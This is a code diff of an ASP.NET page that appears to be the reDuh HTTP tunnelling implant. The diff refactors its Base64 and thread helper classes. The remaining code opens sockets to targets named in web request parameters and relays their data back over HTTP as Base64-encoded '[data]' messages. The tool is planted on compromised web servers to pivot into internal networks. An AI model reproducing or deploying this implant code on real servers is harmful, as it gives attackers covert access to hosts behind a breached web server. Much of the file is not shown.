@@ -11,205 +11,164 @@
 <%@ Import Namespace="System.Web.SessionState" %>
 
 <script runat="server">
+
+public class CryptUtils
+{
+	public static String base64encode(byte[] data)
+	{
+		return base64encode(data, data.Length);
+	}
+
+	public static String base64encode(byte[] data, int len)
+	{
+		return Convert.ToBase64String(data, 0, len)
+				.Replace("+", "-")
+				.Replace("/", "_")
+				.Replace("\r", "")
+				.Replace("\n", "");
+	}
+	
+	public static byte[] base64decode(String str)
+	{
+		return Convert.FromBase64String(str
+				.Replace("-", "+")
+				.Replace("_", "/")
+				.Replace("\r", "")
+				.Replace("\n", ""));
+	}
+}
+
 public interface IThreadRunnable
 {
 	void Run();
 }
-public class SupportClass
+
+public class ThreadClass : IThreadRunnable
 {
-	public static byte[] ToByteArray(sbyte[] sbyteArray)
+	private Thread threadField;
+	public ThreadClass()
 	{
-		byte[] byteArray = null;
-		if (sbyteArray != null)
-		{
-			byteArray = new byte[sbyteArray.Length];
-			for(int index=0; index < sbyteArray.Length; index++)
-				byteArray[index] = (byte) sbyteArray[index];
-		}
-		return byteArray;
+		threadField = new Thread(new ThreadStart(Run));
 	}
-	public static byte[] ToByteArray(String sourceString)
+	public ThreadClass(String Name)
 	{
-		return System.Text.UTF8Encoding.UTF8.GetBytes(sourceString);
+		threadField = new Thread(new ThreadStart(Run));
+		this.Name = Name;
 	}
-	public static byte[] ToByteArray(Object[] tempObjectArray)
+	public ThreadClass(ThreadStart Start)
 	{
-		byte[] byteArray = null;
-		if (tempObjectArray != null)
-		{
-			byteArray = new byte[tempObjectArray.Length];
-			for (int index = 0; index < tempObjectArray.Length; index++)
-				byteArray[index] = (byte)tempObjectArray[index];
-		}
-		return byteArray;
+		threadField = new Thread(Start);
 	}
-	public static sbyte[] ToSByteArray(byte[] byteArray)
+	public ThreadClass(ThreadStart Start, String Name)
 	{
-		sbyte[] sbyteArray = null;
-		if (byteArray != null)
-		{
-			sbyteArray = new sbyte[byteArray.Length];
-			for(int index=0; index < byteArray.Length; index++)
-				sbyteArray[index] = (sbyte) byteArray[index];
-		}
-		return sbyteArray;
+		threadField = new Thread(Start);
+		this.Name = Name;
 	}
-	public static char[] ToCharArray(sbyte[] sByteArray) 
+	public virtual void Run()
 	{
-		return System.Text.UTF8Encoding.UTF8.GetChars(ToByteArray(sByteArray));
 	}
-	public static char[] ToCharArray(byte[] byteArray) 
+	public virtual void Start()
 	{
-		return System.Text.UTF8Encoding.UTF8.GetChars(byteArray);
+		threadField.Start();
 	}
-	public static Int32 ReadInput(Stream sourceStream, sbyte[] target, int start, int count)
+	public virtual void Interrupt()
 	{
-		if (target.Length == 0)
-			return 0;
-		byte[] receiver = new byte[target.Length];
-		int bytesRead   = sourceStream.Read(receiver, start, count);
-		if (bytesRead == 0)	
-			return -1;
-		for(int i = start; i < start + bytesRead; i++)
-			target[i] = (sbyte)receiver[i];
-		return bytesRead;
+		threadField.Interrupt();
 	}
-	public static Int32 ReadInput(TextReader sourceTextReader, sbyte[] target, int start, int count)
+	public System.Threading.Thread Instance
 	{
-		if (target.Length == 0) return 0;
-		char[] charArray = new char[target.Length];
-		int bytesRead = sourceTextReader.Read(charArray, start, count);
-		if (bytesRead == 0) return -1;
-		for(int index=start; index<start+bytesRead; index++)
-			target[index] = (sbyte)charArray[index];
-		return bytesRead;
+		get
+		{
+			return threadField;
+		}
+		set
+		{
+			threadField = value;
+		}
 	}
-	public class ThreadClass : IThreadRunnable
+	public System.String Name
 	{
-		private Thread threadField;
-		public ThreadClass()
+		get
 		{
-			threadField = new Thread(new ThreadStart(Run));
+			return threadField.Name;
 		}
-		public ThreadClass(String Name)
+		set
 		{
-			threadField = new Thread(new ThreadStart(Run));
-			this.Name = Name;
+			if (threadField.Name == null)
+				threadField.Name = value; 
 		}
-		public ThreadClass(ThreadStart Start)
+	}
+	public System.Threading.ThreadPriority Priority
+	{
+		get
 		{
-			threadField = new Thread(Start);
+			return threadField.Priority;
 		}
-		public ThreadClass(ThreadStart Start, String Name)
+		set
 		{
-			threadField = new Thread(Start);
-			this.Name = Name;
+			threadField.Priority = value;
 		}
-		public virtual void Run()
+	}
+	public bool IsAlive
+	{
+		get
 		{
+			return threadField.IsAlive;
 		}
-		public virtual void Start()
+	}
+	public bool IsBackground
+	{
+		get
 		{
-			threadField.Start();
-		}
-		public virtual void Interrupt()
+			return threadField.IsBackground;
+		} 
+		set
 		{
-			threadField.Interrupt();
+			threadField.IsBackground = value;
 		}
-		public System.Threading.Thread Instance
-		{
-			get
-			{
-				return threadField;
-			}
-			set
-			{
-				threadField = value;
-			}
-		}
-		public System.String Name
-		{
-			get
-			{
-				return threadField.Name;
-			}
-			set
-			{
-				if (threadField.Name == null)
-					threadField.Name = value; 
-			}
-		}
-		public System.Threading.ThreadPriority Priority
-		{
-			get
-			{
-				return threadField.Priority;
-			}
-			set
-			{
-				threadField.Priority = value;
-			}
-		}
-		public bool IsAlive
-		{
-			get
-			{
-				return threadField.IsAlive;
-			}
-		}
-		public bool IsBackground
-		{
-			get
-			{
-				return threadField.IsBackground;
-			} 
-			set
-			{
-				threadField.IsBackground = value;
-			}
-		}
-		public void Join()
-		{
-			threadField.Join();
-		}
-		public void Join(long MiliSeconds)
-		{
-				threadField.Join(new TimeSpan(MiliSeconds * 10000));
-		}
-		public void Join(long MiliSeconds, int NanoSeconds)
-		{
-				threadField.Join(new System.TimeSpan(MiliSeconds * 10000 + NanoSeconds * 100));
-		}
-		public void Resume()
-		{
-			threadField.Resume();
-		}
-		public void Abort()
-		{
-			threadField.Abort();
-		}
-		public void Abort(Object stateInfo)
-		{
-				threadField.Abort(stateInfo);
-		}
-		public void Suspend()
-		{
-			threadField.Suspend();
-		}
-		public override String ToString()
-		{
-			return "Thread[" + Name + "," + Priority.ToString() + "," + "" + "]";
-		}
-		public static ThreadClass Current()
-		{
-			ThreadClass CurrentThread = new ThreadClass();
-			CurrentThread.Instance = Thread.CurrentThread;
-			return CurrentThread;
-		}
+	}
+	public void Join()
+	{
+		threadField.Join();
+	}
+	public void Join(long MiliSeconds)
+	{
+			threadField.Join(new TimeSpan(MiliSeconds * 10000));
+	}
+	public void Join(long MiliSeconds, int NanoSeconds)
+	{
+			threadField.Join(new System.TimeSpan(MiliSeconds * 10000 + NanoSeconds * 100));
+	}
+	public void Resume()
+	{
+		threadField.Resume();
+	}
+	public void Abort()
+	{
+		threadField.Abort();
+	}
+	public void Abort(Object stateInfo)
+	{
+			threadField.Abort(stateInfo);
+	}
+	public void Suspend()
+	{
+		threadField.Suspend();
+	}
+	public override String ToString()
+	{
+		return "Thread[" + Name + "," + Priority.ToString() + "," + "" + "]";
+	}
+	public static ThreadClass Current()
+	{
+		ThreadClass CurrentThread = new ThreadClass();
+		CurrentThread.Instance = Thread.CurrentThread;
+		return CurrentThread;
 	}
 }
 
-internal class reDuh:SupportClass.ThreadClass
+
+internal class reDuh:ThreadClass
 {
 	virtual internal int ServicePort
 	{
@@ -232,7 +191,7 @@ internal class reDuh:SupportClass.ThreadClass
 	internal System.Collections.Hashtable sequenceNumbers = System.Collections.Hashtable.Synchronized(new System.Collections.Hashtable());
 	public Queue outputFromSockets = new Queue();
 	internal int delay = 100;
-	internal class redirectorGD:SupportClass.ThreadClass
+	internal class redirectorGD:ThreadClass
 	{
 		private void  InitBlock(reDuh enclosingInstance)
 		{
@@ -262,30 +221,24 @@ internal class reDuh:SupportClass.ThreadClass
 		override public void  Run()
 		{
 			int bufferSize = 8000;
-			sbyte[] buffer = new sbyte[bufferSize];
+			byte[] buffer = new byte[bufferSize];
 			int numberRead = 0;
 			bool moreData = true;
 			try
 			{
 				while (moreData)
 				{
-					numberRead = SupportClass.ReadInput(fromClient, buffer, 0, bufferSize);
-					if (numberRead < 0)
+					numberRead = fromClient.Read(buffer, 0, bufferSize);
+					if (numberRead <= 0)
 					{
 						Queue q = new Queue();
 						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":*");
 						moreData = false;
 						enclosingInstance.connectionPool.Remove(target + ":" + port + ":" + sockNum);
 					}
-					else if (numberRead < bufferSize)
-					{
-						sbyte[] tmpBuffer = new sbyte[numberRead];
-						for (int k = 0; k < numberRead; k++)tmpBuffer[k] = buffer[k];
-						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":" + new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(encode(tmpBuffer)))));
-					}
 					else
 					{
-						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":" + new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(encode(buffer)))));
+						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":" + CryptUtils.base64encode(buffer, numberRead));
 					}
 					Thread.Sleep(1000);
 				}
@@ -299,7 +252,7 @@ internal class reDuh:SupportClass.ThreadClass
 			}
 		}
 	}	
-	internal class redirectorSD:SupportClass.ThreadClass
+	internal class redirectorSD:ThreadClass
 	{
 		private void  InitBlock(reDuh enclosingInstance)
 		{
@@ -339,7 +292,7 @@ internal class reDuh:SupportClass.ThreadClass
 						input =((Queue) enclosingInstance.connectionPool[target.ToString() + ":" + port.ToString() + ":" + sockNum.ToString()]).Dequeue().ToString();
 						System.String seqNum = input.Substring(0, (input.IndexOf(":")) - (0));
 						input = input.Substring(input.IndexOf(":") + 1);
-						sbyte[] tmp = null;
+						byte[] tmp = null;
 						int bytesReadFromHomePort = 0;
 						if (String.CompareOrdinal(input, "*") != 0)
 						{
@@ -347,11 +300,9 @@ internal class reDuh:SupportClass.ThreadClass
 							for (int k = 0; k < input.Length; k += 4)
 							{
 								System.String inputChunk = input.Substring(k, (k + 4) - (k));
-								tmp = decode(SupportClass.ToSByteArray(SupportClass.ToByteArray(inputChunk)));
+								tmp = CryptUtils.base64decode(inputChunk);
 								bytesReadFromHomePort += tmp.Length;
-								sbyte[] temp_sbyteArray;
-								temp_sbyteArray = tmp;
-								toClient.Write(SupportClass.ToByteArray(temp_sbyteArray), 0, temp_sbyteArray.Length);
+								toClient.Write(tmp, 0, tmp.Length);
 							}
 						}
 						else
@@ -367,7 +318,7 @@ internal class reDuh:SupportClass.ThreadClass
 			catch { }
 		}
 	}
-	internal class connHandler:SupportClass.ThreadClass
+	internal class connHandler:ThreadClass
 	{
 		private void  InitBlock(reDuh enclosingInstance)
 		{
@@ -528,7 +479,7 @@ internal class reDuh:SupportClass.ThreadClass
 			}
 		}
 	}	
-	internal class redirectorProcessComm:SupportClass.ThreadClass
+	internal class redirectorProcessComm:ThreadClass
 	{
 		private void  InitBlock(reDuh enclosingInstance)
 		{
@@ -626,139 +577,9 @@ Socket rpcSock = null;
 NetworkStream myNetworkStream = null;
 StreamWriter rw = null;
 StreamReader rd = null;
-private static sbyte[] ALPHASET = SupportClass.ToSByteArray(SupportClass.ToByteArray("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="));
-private static int[] CODES = new int[256];
-private const int I6O2 = 255 - 3;
-private const int O6I2 = 3;
-private const int I4O4 = 255 - 15;
-private const int O4I4 = 15;
-private const int I2O6 = 255 - 63;
-private const int O2I6 = 63;
-public static String encode(String s)
-{
-	sbyte[] sBytes = SupportClass.ToSByteArray(SupportClass.ToByteArray(s));
-	sBytes = encode(sBytes);
-	s = new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(sBytes)));
-	return s;
-}
-public static System.String decode(System.String s)
-{
-	while (s.IndexOf("\n") > -1) s = s.Replace("\n", "");
-	while (s.IndexOf("\r") > -1) s = s.Replace("\r", "");
-	sbyte[] sBytes = SupportClass.ToSByteArray(SupportClass.ToByteArray(s));
-	sBytes = decode(sBytes);
-	s = new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(sBytes)));
-	return s;
-}
-public static sbyte[] encode(sbyte[] dData)
-{
-	if (dData == null)
-	{
-		throw new System.ArgumentException("Cannot encode null");
-	}
-	sbyte[] eData = new sbyte[((dData.Length + 2) / 3) * 4];	
-	int eIndex = 0;
-	for (int i = 0; i < dData.Length; i += 3)
-	{
-		int d1;
-		int d2 = 0;
-		int d3 = 0;
-		int e1;
-		int e2;
-		int e3;
-		int e4;
-		int pad = 0;	
-		d1 = dData[i];
-		if ((i + 1) < dData.Length)
-		{
-			d2 = dData[i + 1];
-			if ((i + 2) < dData.Length)
-			{
-				d3 = dData[i + 2];
-			}
-			else
-			{
-				pad = 1;
-			}
-		}
-		else
-		{
-			pad = 2;
-		}
-		e1 = ALPHASET[(d1 & I6O2) >> 2];
-		e2 = ALPHASET[(d1 & O6I2) << 4 | (d2 & I4O4) >> 4];
-		e3 = ALPHASET[(d2 & O4I4) << 2 | (d3 & I2O6) >> 6];
-		e4 = ALPHASET[(d3 & O2I6)];
-		eData[eIndex++] = (sbyte) e1;
-		eData[eIndex++] = (sbyte) e2;
-		eData[eIndex++] = (pad < 2)?(sbyte) e3:(sbyte) '=';
-		eData[eIndex++] = (pad < 1)?(sbyte) e4:(sbyte) '=';
-	}
-	return eData;
-}
-public static sbyte[] decode(sbyte[] eData)
-{
-	if (eData == null)
-	{
-		throw new System.ArgumentException("Cannot decode null");
-	}
-	sbyte[] cleanEData = (sbyte[]) eData.Clone();
-	int cleanELength = 0;
-	for (int i = 0; i < eData.Length; i++)
-	{
-		if (eData[i] < 256 && CODES[eData[i]] < 64)
-		{
-			cleanEData[cleanELength++] = eData[i];
-		}
-	}
-	int dLength = (cleanELength / 4) * 3;
-	switch (cleanELength % 4)
-	{	
-		case 3: 
-			dLength += 2;
-			break;	
-		case 2: 
-			dLength++;
-			break;
-	}
-	sbyte[] dData = new sbyte[dLength];
-	int dIndex = 0;
-	for (int i = 0; i < eData.Length; i += 4)
-	{
-		if ((i + 3) > eData.Length)
-		{
-			throw new System.ArgumentException("byte array is not a valid com.sun.syndication.io.impl.Base64 encoding");
-		}
-		int e1 = CODES[cleanEData[i]];
-		int e2 = CODES[cleanEData[i + 1]];
-		int e3 = CODES[cleanEData[i + 2]];
-		int e4 = CODES[cleanEData[i + 3]];
-		dData[dIndex++] = (sbyte) ((e1 << 2) | (e2 >> 4));
-		if (dIndex < dData.Length)
-		{
-			dData[dIndex++] = (sbyte) ((e2 << 4) | (e3 >> 2));
-		}
-		if (dIndex < dData.Length)
-		{
-			dData[dIndex++] = (sbyte) ((e3 << 6) | (e4));
-		}
-	}
-	return dData;
-}
-private void InitClassVars()
-{
-	for (int i=0;i<CODES.Length;i++)
-	{
-		CODES[i] = 64;
-	}
-	for (int i=0;i<ALPHASET.Length;i++)
-	{
-		CODES[ALPHASET[i]] = i;
-	}
-}
+
 private void Page_Load(object sender, System.EventArgs e)
 {
-	InitClassVars();
 	s_path = System.Web.HttpContext.Current.Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]);
 	action = Request["action"];
 	cmd = Request["command"];
@@ -838,7 +659,7 @@ private void Page_Load(object sender, System.EventArgs e)
 				rpcSock = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 				rpcSock.Connect(ipe);
 				myNetworkStream = new NetworkStream(rpcSock);
-				byte[] stuff = SupportClass.ToByteArray("[getData]\r\n");
+				byte[] stuff = System.Text.UTF8Encoding.UTF8.GetBytes("[getData]\r\n");
 				myNetworkStream.Write(stuff, 0, stuff.GetLength(0));
 				rd = new System.IO.StreamReader(myNetworkStream, System.Text.Encoding.Default);
 				String input = null;
